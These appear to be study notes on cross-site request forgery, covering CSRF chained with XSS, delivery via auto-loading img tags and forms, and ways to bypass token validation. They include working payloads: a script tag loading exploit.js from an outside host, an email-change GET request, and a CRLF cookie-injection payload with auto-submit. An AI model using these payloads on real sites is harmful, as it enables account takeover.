`CSRF` attacks may utilize `XSS` vulnerabilities to perform certain queries, and `API` calls on a web application that the victim is currently authenticated to.

A common `CSRF` attack to gain higher privileged access to a web application is to craft a `JavaScript` payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the `JavaScript` `CSRF` payload), the `JavaScript` code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

```html
"><script src=//www.example.com/exploit.js></script>
```

##### Prevention
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

##### Deliver
GET:
`<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">`

POST: dedicated html page with form and JS for auto submit. In #bupr RMB on request, engagement tools, create CSRF POC.

## Common flaws in CSRF token validation
##### Validation of CSRF token depends on request method
Try to change request method to `GET` and any other.

##### Validation of CSRF token depends on token being present
Some apps skip the token validation if it is omitted.

#### CSRF token is not tied to the user session
Attacker can log in to the app, obtain a valid token and feed that token to the victim in their CSRF attack.

#### CSRF token is tied to a non-session cookie
```html
...
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

#### CSRF where token is duplicated in cookie
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

In this situation, the attacker can again perform a CSRF attack if the website contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.